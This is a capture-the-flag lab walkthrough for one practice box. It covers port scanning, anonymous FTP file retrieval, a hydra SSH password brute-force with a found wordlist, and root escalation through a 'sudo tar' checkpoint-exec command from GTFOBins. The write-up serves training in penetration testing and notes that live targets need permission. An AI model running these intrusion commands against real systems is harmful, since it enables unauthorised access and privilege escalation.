### 1) Port scan

`nmap -sC -sV -T4 10.10.32.32` — result: ports **21 (FTP), 22 (SSH), 80 (HTTP)** open. 

### 2) Web quick check

Visit `http://10.10.32.32` — often nothing useful, but always check `robots.txt`, `.git`, common paths with `gobuster`. 

### 3) FTP access & files

Connect to FTP and check directories:

`ftp 10.10.32.32 # try: user anonymous you@example.com ls`

Found `locks.txt` and `task.txt` on FTP — download them in passive mode using `get`

### 4) Inspect files locally

Open `task.txt` to see hints/usernames, and `locks.txt` for candidate passwords.

`cat task.txt cat locks.txt`

(Example: `task.txt` referenced a user `lin`.) 

### 5) Crack SSH password (if allowed by room)

Use a password list (e.g., `locks.txt`) with `hydra`:

`hydra -l lin -P locks.txt ssh://10.10.32.32`

When password found, SSH in: `ssh lin@10.10.32.32`. 

### 6) Local enumeration

Once `lin` shell:

`pwd; id; ls -la cat ~/Desktop/user.txt # Basic priv-esc checks sudo -l`

`user.txt` = user flag (typical). 

### 7) Privilege escalation using `sudo tar`

If `sudo -l` shows `/bin/tar` is runnable as root, use the GTFOBins method to spawn a root shell:

`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`

This gives a root shell (works on GNU tar) — then `cat /root/root.txt`. [GTFOBins+1](https://gtfobins.github.io/gtfobins/tar/)

---

## Notes & quick tips

- If FTP denies anonymous, try enumerating other web-discoverable creds or look for config files on the web. 
    
- `hydra` is noisy — in CTFs it’s fine, but on live targets get written permission.
    
- `sudo -l` is the fastest path to know which binary to abuse. Always check it early.
    
- GTFOBins is the canonical reference for abusing allowed/sudo binaries. [GTFOBins](https://gtfobins.github.io/gtfobins/tar/)